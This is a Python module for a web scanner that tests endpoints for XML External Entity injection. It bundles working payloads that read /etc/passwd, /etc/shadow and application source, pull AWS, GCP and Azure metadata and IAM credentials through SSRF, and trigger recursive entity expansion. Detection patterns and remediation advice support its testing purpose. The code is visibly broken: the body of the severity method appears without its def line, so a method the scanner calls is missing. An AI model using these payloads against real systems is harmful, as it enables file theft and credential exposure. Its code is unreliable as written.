# scanner/a05_injection/xxe.py
"""
XML External Entity (XXE) Injection Scanner

Detects XXE vulnerabilities including:
- Classic file disclosure via external entities
- Blind XXE via out-of-band detection
- SSRF via XML external entity
- Error-based XXE (content in parse errors)
- Parameter entity injection (filter bypass)
- Billion Laughs DoS (recursive entity expansion)
- PHP stream wrapper abuse
- SOAP/WSDL endpoint targeting
- SVG/Office XML file upload vectors

OWASP: A05:2025 - Injection
CWE-611: Improper Restriction of XML External Entity Reference
CWE-776: Improper Restriction of Recursive Entity References (Billion Laughs)
CWE-91:  XML Injection
"""

import re
import asyncio
from typing import List, Dict, Optional, Tuple
import aiohttp
from urllib.parse import urljoin, urlparse

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class XXEScanner(BaseScanner):
    """Scanner for XML External Entity (XXE) Injection vulnerabilities"""

    name = "XXE Injection Scanner"
    description = "Detects XXE vulnerabilities via reflected, error-based, and blind detection techniques"
    owasp_category = OWASPCategory.A05_INJECTION

    # -------------------------------------------------------------------------
    # Payloads
    # -------------------------------------------------------------------------

    # Classic reflected XXE — file content appears directly in the response
    REFLECTED_PAYLOADS: List[Tuple[str, str, str]] = [
        (
            # Linux passwd file
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<root><data>&xxe;</data></root>",
            "file:///etc/passwd",
            "Classic XXE - /etc/passwd",
        ),
        (
            # Linux shadow (rarely readable but confirms XXE if it works)
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>'
            "<root><data>&xxe;</data></root>",
            "file:///etc/shadow",
            "Classic XXE - /etc/shadow",
        ),
        (
            # Linux hostname
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
            "<root><data>&xxe;</data></root>",
            "file:///etc/hostname",
            "Classic XXE - /etc/hostname",
        ),
        (
            # Linux OS release info
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/os-release">]>'
            "<root><data>&xxe;</data></root>",
            "file:///etc/os-release",
            "Classic XXE - /etc/os-release",
        ),
        (
            # Windows win.ini
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
            "<root><data>&xxe;</data></root>",
            "file:///C:/Windows/win.ini",
            "Classic XXE - Windows win.ini",
        ),
        (
            # Windows boot.ini
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]>'
            "<root><data>&xxe;</data></root>",
            "file:///C:/boot.ini",
            "Classic XXE - Windows boot.ini",
        ),
        (
            # PHP wrapper — base64-encodes file so it survives XML parsing
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>'
            "<root><data>&xxe;</data></root>",
            "php://filter",
            "PHP Wrapper XXE - base64 /etc/passwd",
        ),
        (
            # PHP wrapper targeting the app's own index
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>'
            "<root><data>&xxe;</data></root>",
            "php://filter",
            "PHP Wrapper XXE - base64 index.php",
        ),
    ]

    # SSRF via XXE — entity resolves to internal/cloud services
    SSRF_PAYLOADS: List[Tuple[str, str, str]] = [
        (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>'
            "<root><data>&xxe;</data></root>",
            "http://127.0.0.1/",
            "XXE-SSRF - localhost",
        ),
        (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]>'
            "<root><data>&xxe;</data></root>",
            "http://127.0.0.1:8080/",
            "XXE-SSRF - localhost:8080",
        ),
        (
            # AWS instance metadata
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
            "<root><data>&xxe;</data></root>",
            "http://169.254.169.254/",
            "XXE-SSRF - AWS metadata",
        ),
        (
            # AWS IAM credentials
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>'
            "<root><data>&xxe;</data></root>",
            "http://169.254.169.254/iam",
            "XXE-SSRF - AWS IAM credentials",
        ),
        (
            # GCP metadata
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>'
            "<root><data>&xxe;</data></root>",
            "http://metadata.google.internal/",
            "XXE-SSRF - GCP metadata",
        ),
        (
            # Azure metadata
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance">]>'
            "<root><data>&xxe;</data></root>",
            "http://169.254.169.254/metadata",
            "XXE-SSRF - Azure metadata",
        ),
    ]

    # Error-based XXE — malformed entity triggers parse error that leaks content
    ERROR_PAYLOADS: List[Tuple[str, str, str]] = [
        (
            # Nest the file entity inside an invalid entity ref to trigger error
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>"> %eval; %error;]>'
            "<root/>",
            "file:///etc/passwd",
            "Error-based XXE - /etc/passwd via invalid URI",
        ),
        (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>"> %eval; %error;]>'
            "<root/>",
            "file:///etc/hostname",
            "Error-based XXE - /etc/hostname via invalid URI",
        ),
    ]

    # Parameter entity XXE — bypasses filters that block &entity; in content
    PARAMETER_ENTITY_PAYLOADS: List[Tuple[str, str, str]] = [
        (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>'
            "<root/>",
            "file:///etc/passwd",
            "Parameter Entity XXE - %xxe;",
        ),
        (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY % a "file:///etc/passwd"> '
            '<!ENTITY % b "<!ENTITY c SYSTEM \'%a;\'>"> %b; ]>'
            "<root><data>&c;</data></root>",
            "file:///etc/passwd",
            "Nested Parameter Entity XXE",
        ),
    ]

    # Billion Laughs — DoS via recursive entity expansion
    # Note: kept shallow intentionally; enough to detect if parser is vulnerable
    BILLION_LAUGHS_PAYLOAD: str = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<!DOCTYPE lolz ["
        '  <!ENTITY lol "lol">'
        '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
        '  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
        "]>"
        "<root>&lol4;</root>"
    )

    # Benign probe to check if endpoint accepts XML at all
    BENIGN_XML: str = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<probe><check>xxe-test</check></probe>"
    )

    # -------------------------------------------------------------------------
    # Detection patterns
    # -------------------------------------------------------------------------

    # Patterns confirming successful file read in the response
    LINUX_EVIDENCE: List[str] = [
        r"root:.*:0:0:",           # /etc/passwd root entry
        r"daemon:.*:1:1:",
        r"nobody:.*:65534:",
        r"/bin/bash",
        r"/bin/sh",
        r"Linux.*\d+\.\d+",       # /etc/os-release
        r"NAME=\"(Ubuntu|Debian|CentOS|Alpine|Fedora|Red Hat)",
    ]

    WINDOWS_EVIDENCE: List[str] = [
        r"\[extensions\]",         # win.ini
        r"\[fonts\]",
        r"\[files\]",
        r"\[boot loader\]",        # boot.ini
        r"operating systems",
    ]

    PHP_WRAPPER_EVIDENCE: List[str] = [
        r"[A-Za-z0-9+/]{40,}={0,2}",  # Base64 blob — raw content encoded by php://filter
    ]

    CLOUD_METADATA_EVIDENCE: List[str] = [
        r"ami-[0-9a-f]{8,}",       # AWS AMI ID
        r"instance-id",
        r"security-credentials",
        r"AccessKeyId",
        r"SecretAccessKey",
        r"computeMetadata",         # GCP
        r"\"compute\"",
        r"\"instance\".*\"zone\"",
    ]

    # Parser errors that suggest the entity was partially resolved
    ERROR_EVIDENCE: List[str] = [
        r"root:.*:0:0:",
        r"XML.*parse.*error",
        r"XMLParseException",
        r"SAXParseException",
        r"ExternalGeneralEntitiesFeature",
        r"DOCTYPE is disallowed",    # Parser blocked it — still informational
        r"entity.*not.*defined",
        r"SYSTEM.*not.*supported",
    ]

    # XML-consuming parameter name patterns
    XML_PARAM_PATTERNS: List[str] = [
        r"xml", r"data", r"body", r"payload", r"content",
        r"import", r"upload", r"feed", r"document", r"doc",
        r"request", r"input", r"message", r"soap", r"wsdl",
        r"config", r"settings", r"template",
    ]

    # Common XML/SOAP endpoint paths to probe
    XML_ENDPOINTS: List[str] = [
        "/api/xml",
        "/xml",
        "/soap",
        "/ws",
        "/wsdl",
        "/service",
        "/services",
        "/api/import",
        "/import",
        "/upload",
        "/api/upload",
        "/api/data",
        "/api/feed",
        "/api/v1/xml",
        "/api/v2/xml",
        "/rpc",
        "/xmlrpc",
        "/xmlrpc.php",
        "/api/xmlrpc",
    ]

    # Content types that indicate XML is accepted
    XML_CONTENT_TYPES: List[str] = [
        "application/xml",
        "text/xml",
        "application/soap+xml",
        "application/xhtml+xml",
        "application/rss+xml",
        "application/atom+xml",
        "image/svg+xml",
    ]

    # -------------------------------------------------------------------------
    # Main scan entry point
    # -------------------------------------------------------------------------

    async def scan(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str] = None,
    ) -> List[Vulnerability]:
        """
        Scan for XXE vulnerabilities.

        Strategy:
        1. Probe the given URL to detect XML acceptance
        2. Probe known XML/SOAP endpoint paths
        3. Inject payloads into any XML-accepting endpoint
        4. Check params for XML param names and test those too
        """
        vulnerabilities: List[Vulnerability] = []

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Collect candidate endpoints to test
        endpoints_to_test: List[str] = []

        # Always test the original URL if it looks like an API endpoint
        if any(seg in parsed.path for seg in ["/api", "/xml", "/soap", "/ws", "/upload", "/import"]):
            endpoints_to_test.append(url)

        # Probe common XML endpoints on the same host
        for path in self.XML_ENDPOINTS:
            endpoints_to_test.append(urljoin(base_url, path))

        # Test each candidate
        tested: set = set()
        for endpoint in endpoints_to_test:
            if endpoint in tested:
                continue
            tested.add(endpoint)

            accepts_xml, baseline_body = await self._probe_xml_acceptance(session, endpoint)
            if not accepts_xml:
                continue

            # Run all payload categories, passing baseline for anomaly comparison
            vulns = await self._test_endpoint(session, endpoint, baseline_body)
            vulnerabilities.extend(vulns)

        # Also check if any URL params look XML-related
        if params:
            xml_params = self._find_xml_params(params)
            if xml_params:
                param_vulns = await self._test_xml_params(session, url, params, xml_params)
                vulnerabilities.extend(param_vulns)

        return self._deduplicate_vulns(vulnerabilities)

    # -------------------------------------------------------------------------
    # XML acceptance probe
    # -------------------------------------------------------------------------

    async def _probe_xml_acceptance(
        self,
        session: aiohttp.ClientSession,
        url: str,
    ) -> Tuple[bool, str]:
        """
        Send a benign XML body and decide if the endpoint looks like it
        processes XML.

        Returns (accepts_xml, baseline_body) so callers can use the baseline
        body for anomaly comparison against payload responses.
        """
        baseline_body = ""

        try:
            async with session.post(
                url,
                data=self.BENIGN_XML,
                headers={"Content-Type": "application/xml"},
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False,
            ) as response:
                if response.status not in [404, 410]:
                    content_type = response.headers.get("Content-Type", "")
                    baseline_body = await response.text()

                    if any(ct in content_type for ct in self.XML_CONTENT_TYPES):
                        return True, baseline_body

                    if "xxe-test" in baseline_body or "<" in baseline_body[:500]:
                        return True, baseline_body

                    if response.status < 400:
                        return True, baseline_body

        except Exception:
            pass

        # Also check via GET with Accept: application/xml
        try:
            async with session.get(
                url,
                headers={"Accept": "application/xml"},
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False,
            ) as response:
                content_type = response.headers.get("Content-Type", "")
                if any(ct in content_type for ct in self.XML_CONTENT_TYPES):
                    baseline_body = await response.text()
                    return True, baseline_body

        except Exception:
            pass

        return False, baseline_body

    # -------------------------------------------------------------------------
    # Payload testing
    # -------------------------------------------------------------------------

    async def _test_endpoint(
        self,
        session: aiohttp.ClientSession,
        url: str,
        baseline_body: str = "",
    ) -> List[Vulnerability]:
        """Run all XXE payload categories against a confirmed XML endpoint."""
        vulns: List[Vulnerability] = []

        # 1. Reflected payloads
        for payload, target, label in self.REFLECTED_PAYLOADS:
            vuln = await self._send_payload(
                session, url, payload, target, label,
                check_type="reflected",
                baseline_body=baseline_body,
            )
            if vuln:
                vulns.append(vuln)
                break  # One confirmed reflected XXE is enough per endpoint

        # 2. SSRF payloads (only if no reflected hit yet — avoids noise)
        if not vulns:
            for payload, target, label in self.SSRF_PAYLOADS:
                vuln = await self._send_payload(
                    session, url, payload, target, label,
                    check_type="ssrf",
                    baseline_body=baseline_body,
                )
                if vuln:
                    vulns.append(vuln)
                    break

        # 3. Error-based payloads
        for payload, target, label in self.ERROR_PAYLOADS:
            vuln = await self._send_payload(
                session, url, payload, target, label,
                check_type="error",
                baseline_body=baseline_body,
            )
            if vuln:
                vulns.append(vuln)
                break

        # 4. Parameter entity payloads (filter bypass attempt)
        for payload, target, label in self.PARAMETER_ENTITY_PAYLOADS:
            vuln = await self._send_payload(
                session, url, payload, target, label,
                check_type="reflected",
                baseline_body=baseline_body,
            )
            if vuln:
                vulns.append(vuln)
                break

        # 5. Billion Laughs DoS detection
        dos_vuln = await self._test_billion_laughs(session, url)
        if dos_vuln:
            vulns.append(dos_vuln)

        return vulns

    async def _send_payload(
        self,
        session: aiohttp.ClientSession,
        url: str,
        payload: str,
        target: str,
        label: str,
        check_type: str = "reflected",
        baseline_body: str = "",
    ) -> Optional[Vulnerability]:
        """
        Send a single XXE payload and inspect the response.
        check_type: "reflected" | "ssrf" | "error"

        Falls back to anomaly comparison against baseline_body when no
        pattern match is found — flags as LOW severity for manual review.
        """
        try:
            for content_type in ["application/xml", "text/xml"]:
                async with session.post(
                    url,
                    data=payload,
                    headers={"Content-Type": content_type},
                    timeout=aiohttp.ClientTimeout(total=15),
                    ssl=False,
                ) as response:
                    body = await response.text()

                    # Primary check — pattern-based confirmation
                    evidence = self._detect_evidence(body, check_type)
                    if evidence:
                        severity = self._determine_severity(target, check_type)
                        return self.create_vulnerability(
                            vuln_type=f"XXE Injection - {label}",
                            severity=severity,
                            url=url,
                            parameter="XML body",
                            payload=payload[:200] + ("..." if len(payload) > 200 else ""),
                            evidence=f"{label}: {evidence}",
                            description=self._build_description(label, target, check_type),
                            cwe_id="CWE-611",
                            cvss_score=self._severity_to_cvss(severity),
                            remediation=self._get_remediation(),
                            references=[
                                "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                "https://portswigger.net/web-security/xxe",
                                "https://cwe.mitre.org/data/definitions/611.html",
                            ],
                        )

                    # Secondary check — anomaly comparison against baseline
                    # No pattern match but response is structurally different from
                    # the benign probe → flag LOW for manual verification
                    if baseline_body:
                        anomaly = self._check_response_anomaly(body, baseline_body, label)
                        if anomaly:
                            return anomaly._replace(url=url)

        except asyncio.TimeoutError:
            pass
        except Exception:
            pass

        return None

    async def _test_billion_laughs(
        self,
        session: aiohttp.ClientSession,
        url: str,
    ) -> Optional[Vulnerability]:
        """
        Test for Billion Laughs DoS vulnerability.
        A very slow or timed-out response after sending this payload
        indicates the parser is expanding entities recursively.
        """
        import time

        try:
            start = time.monotonic()
            async with session.post(
                url,
                data=self.BILLION_LAUGHS_PAYLOAD,
                headers={"Content-Type": "application/xml"},
                timeout=aiohttp.ClientTimeout(total=20),
                ssl=False,
            ) as response:
                elapsed = time.monotonic() - start
                body = await response.text()

                # If the response body is very large (expanded entities) or took >8s
                if elapsed > 8 or len(body) > 500_000:
                    return self.create_vulnerability(
                        vuln_type="XXE - Billion Laughs DoS (Recursive Entity Expansion)",
                        severity=Severity.HIGH,
                        url=url,
                        parameter="XML body",
                        payload="Billion Laughs nested entity payload",
                        evidence=(
                            f"Response took {elapsed:.1f}s / body size {len(body)} bytes — "
                            "parser appears to be expanding recursive entities"
                        ),
                        description=(
                            "The XML parser expanded deeply nested entity definitions without "
                            "enforcing recursion limits, which can exhaust server memory and CPU "
                            "(Billion Laughs / XML bomb attack). CWE-776."
                        ),
                        cwe_id="CWE-776",
                        cvss_score=7.5,
                        remediation=(
                            "Disable recursive entity expansion in the XML parser. "
                            "Set a hard limit on entity expansion depth and total expanded size. "
                            "In Java: set FEATURE_SECURE_PROCESSING. "
                            "In Python (lxml): use resolve_entities=False. "
                            "In .NET: set DtdProcessing to Prohibit."
                        ),
                        references=[
                            "https://cwe.mitre.org/data/definitions/776.html",
                            "https://en.wikipedia.org/wiki/Billion_laughs_attack",
                        ],
                    )

        except asyncio.TimeoutError:
            # Timed out entirely — strong signal of recursive expansion
            return self.create_vulnerability(
                vuln_type="XXE - Billion Laughs DoS (Recursive Entity Expansion)",
                severity=Severity.HIGH,
                url=url,
                parameter="XML body",
                payload="Billion Laughs nested entity payload",
                evidence="Request timed out after 20s — server likely hung on recursive entity expansion",
                description=(
                    "The XML parser appears to have hung or crashed processing deeply nested "
                    "entity references (Billion Laughs attack). This can cause server-wide DoS."
                ),
                cwe_id="CWE-776",
                cvss_score=7.5,
                remediation=self._get_dos_remediation(),
                references=[
                    "https://cwe.mitre.org/data/definitions/776.html",
                    "https://en.wikipedia.org/wiki/Billion_laughs_attack",
                ],
            )
        except Exception:
            pass

        return None

    # -------------------------------------------------------------------------
    # XML param testing
    # -------------------------------------------------------------------------

    def _find_xml_params(self, params: Dict[str, str]) -> List[str]:
        """Return param names that look like they might carry XML data."""
        xml_params = []
        for name in params:
            if any(re.search(p, name, re.IGNORECASE) for p in self.XML_PARAM_PATTERNS):
                xml_params.append(name)
        return xml_params

    async def _test_xml_params(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict[str, str],
        xml_params: List[str],
    ) -> List[Vulnerability]:
        """Inject XXE payloads into URL/form params that look XML-related."""
        vulns: List[Vulnerability] = []

        for param_name in xml_params[:3]:  # Limit to avoid excessive requests
            for payload, target, label in self.REFLECTED_PAYLOADS[:3]:
                test_params = params.copy()
                test_params[param_name] = payload

                try:
                    async with session.get(
                        url,
                        params=test_params,
                        timeout=aiohttp.ClientTimeout(total=15),
                        ssl=False,
                    ) as response:
                        body = await response.text()
                        evidence = self._detect_evidence(body, "reflected")
                        if evidence:
                            severity = Severity.CRITICAL
                            vulns.append(
                                self.create_vulnerability(
                                    vuln_type=f"XXE via URL Parameter - {label}",
                                    severity=severity,
                                    url=url,
                                    parameter=param_name,
                                    payload=payload[:200],
                                    evidence=f"Parameter '{param_name}': {evidence}",
                                    description=(
                                        f"The URL parameter '{param_name}' is processed as XML "
                                        f"and external entities are resolved. Injecting a SYSTEM "
                                        f"entity for '{target}' returned file contents."
                                    ),
                                    cwe_id="CWE-611",
                                    cvss_score=9.1,
                                    remediation=self._get_remediation(),
                                    references=[
                                        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                        "https://cwe.mitre.org/data/definitions/611.html",
                                    ],
                                )
                            )
                            break  # One hit per param is enough

                except Exception:
                    continue

        return vulns

    # -------------------------------------------------------------------------
    # Evidence detection helpers
    # -------------------------------------------------------------------------

    def _detect_evidence(self, body: str, check_type: str) -> Optional[str]:
        """
        Look for indicators of successful XXE in the response body.
        Returns a short evidence string or None if not found.

        File content patterns (Linux/Windows) are always checked regardless of
        check_type because error messages often embed the resolved file content
        directly in the error text (e.g. "file not found: /nonexistent/root:x:0:0:...").
        """
        # Always start with file content patterns — these are the strongest signal
        # and can appear in reflected responses, error messages, and SSRF responses alike
        always_check = self.LINUX_EVIDENCE + self.WINDOWS_EVIDENCE

        # Then add check_type-specific patterns on top
        extra: List[str] = []
        if check_type == "reflected":
            extra = self.PHP_WRAPPER_EVIDENCE
        elif check_type == "ssrf":
            extra = self.CLOUD_METADATA_EVIDENCE
        elif check_type == "error":
            extra = self.ERROR_EVIDENCE

        for pattern in always_check + extra:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                # Return a short snippet around the match for the report evidence field
                start = max(0, match.start() - 20)
                end = min(len(body), match.end() + 40)
                snippet = body[start:end].strip().replace("\n", " ")
                return f"Pattern '{pattern}' matched: ...{snippet}..."

        # Soft signal: DOCTYPE/ENTITY keywords reflected back in an error response
        # means the parser saw the DTD but blocked entity resolution — still worth noting
        if check_type == "error" and "DOCTYPE" in body and "ENTITY" in body:
            return "DOCTYPE/ENTITY reflected in error response — parser may be processing DTD"

        return None

    def _check_response_anomaly(
        self,
        payload_body: str,
        baseline_body: str,
        label: str,
    ) -> Optional[Vulnerability]:
        """
        Compare a payload response against the benign baseline to spot anomalies
        that pattern matching didn't catch.

        Flags as Severity.LOW — requires manual verification. Catches cases where:
        - The response is significantly longer (entity content was injected)
        - The response structure changed (extra XML elements appeared)
        - The response became shorter/empty (parser error swallowed the response)

        Returns a partially built Vulnerability (url is filled in by caller).
        """
        baseline_len = len(baseline_body)
        payload_len = len(payload_body)

        # No baseline to compare against
        if baseline_len == 0:
            return None

        size_ratio = payload_len / baseline_len if baseline_len > 0 else 0

        # Response grew by more than 3x — possible file content was injected
        if size_ratio > 3.0 and payload_len > 200:
            return self.create_vulnerability(
                vuln_type=f"Possible XXE - Anomalous Response Size ({label})",
                severity=Severity.LOW,
                url="",  # filled in by caller
                parameter="XML body",
                payload=label,
                evidence=(
                    f"Payload response is {payload_len} bytes vs baseline {baseline_len} bytes "
                    f"({size_ratio:.1f}x larger). No pattern matched but size increase may indicate "
                    f"external entity content was injected. Manual verification recommended."
                ),
                description=(
                    "The XML endpoint returned a significantly larger response when an XXE payload "
                    "was sent compared to the benign baseline. This may indicate external entity "
                    "content was resolved and injected into the response, but no known file content "
                    "patterns were detected. Could be a false positive if the endpoint is dynamic."
                ),
                cwe_id="CWE-611",
                cvss_score=0.0,  # Unconfirmed — CVSS not assigned until verified
                remediation=self._get_remediation(),
                references=[
                    "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                ],
            )

        # Response shrank to near-zero — parser may have errored and suppressed output
        # which can happen with error-based XXE where the error is logged but not returned
        if baseline_len > 100 and payload_len < 50:
            return self.create_vulnerability(
                vuln_type=f"Possible XXE - Response Suppressed ({label})",
                severity=Severity.LOW,
                url="",  # filled in by caller
                parameter="XML body",
                payload=label,
                evidence=(
                    f"Payload response is {payload_len} bytes vs baseline {baseline_len} bytes. "
                    f"Near-empty response may indicate a parse exception was triggered. "
                    f"Manual verification recommended — check server error logs."
                ),
                description=(
                    "The XML endpoint returned a near-empty response when an XXE payload was sent, "
                    "compared to a normal response for the benign baseline. This may indicate the "
                    "XML parser threw an exception (potentially after resolving the external entity) "
                    "and the application suppressed the output. Check server-side error logs."
                ),
                cwe_id="CWE-611",
                cvss_score=0.0,
                remediation=self._get_remediation(),
                references=[
                    "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                ],
            )

        return None
        """Assign severity based on what was accessed."""
        if "shadow" in target or "credentials" in target or "iam" in target:
            return Severity.CRITICAL
        if "passwd" in target or "metadata" in target or "127.0.0.1" in target:
            return Severity.CRITICAL
        if check_type == "ssrf":
            return Severity.HIGH
        if check_type == "error":
            return Severity.MEDIUM
        return Severity.HIGH

    def _severity_to_cvss(self, severity: Severity) -> float:
        mapping = {
            Severity.CRITICAL: 9.8,
            Severity.HIGH: 8.2,
            Severity.MEDIUM: 5.5,
            Severity.LOW: 3.1,
            Severity.INFO: 0.0,
        }
        return mapping.get(severity, 5.0)

    # -------------------------------------------------------------------------
    # Description and remediation builders
    # -------------------------------------------------------------------------

    def _build_description(self, label: str, target: str, check_type: str) -> str:
        base = (
            f"The application's XML parser processes external entity declarations and "
            f"resolves SYSTEM URIs. This allows an attacker to read arbitrary files from "
            f"the server filesystem or make the server issue HTTP requests to internal services."
        )
        if check_type == "ssrf":
            base += (
                f" In this case, the entity pointed to '{target}', enabling Server-Side "
                f"Request Forgery. Cloud metadata endpoints (AWS, GCP, Azure) are particularly "
                f"high-value targets that can expose instance credentials."
            )
        elif "php://filter" in target:
            base += (
                f" The PHP stream wrapper 'php://filter' was used to base64-encode file "
                f"contents before they're embedded in the XML, bypassing restrictions on "
                f"binary content or null bytes in entity values."
            )
        return base

    def _get_remediation(self) -> str:
        return (
            "1. Disable external entity processing in your XML parser:\n"
            "   - Java (DocumentBuilderFactory): setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n"
            "   - Java (SAXParserFactory): setFeature('http://xml.org/sax/features/external-general-entities', false)\n"
            "   - Python (lxml): use etree.XMLParser(resolve_entities=False, no_network=True)\n"
            "   - Python (defusedxml): use defusedxml.ElementTree.fromstring() — drop-in safe replacement\n"
            "   - .NET: set XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit\n"
            "   - PHP (libxml): use LIBXML_NOENT=false and libxml_disable_entity_loader(true)\n"
            "   - Node.js: avoid xml2js with default settings; use safer parsers\n"
            "2. If DTD processing is required, use a whitelist of allowed SYSTEM URIs.\n"
            "3. Run XML input through input validation before parsing.\n"
            "4. Consider switching to a data format that doesn't support external references (e.g. JSON).\n"
            "5. Apply least-privilege to the process running the XML parser to limit filesystem access."
        )

    def _get_dos_remediation(self) -> str:
        return (
            "1. Enable FEATURE_SECURE_PROCESSING in the XML parser to enforce entity expansion limits.\n"
            "2. Set a maximum entity expansion depth (e.g. 64 levels) and total expansion size limit.\n"
            "3. Disable DTD processing entirely if not required.\n"
            "4. Use defusedxml (Python) or equivalent safe-by-default parser wrappers.\n"
            "5. Implement request size limits and timeouts on XML-consuming endpoints."
        )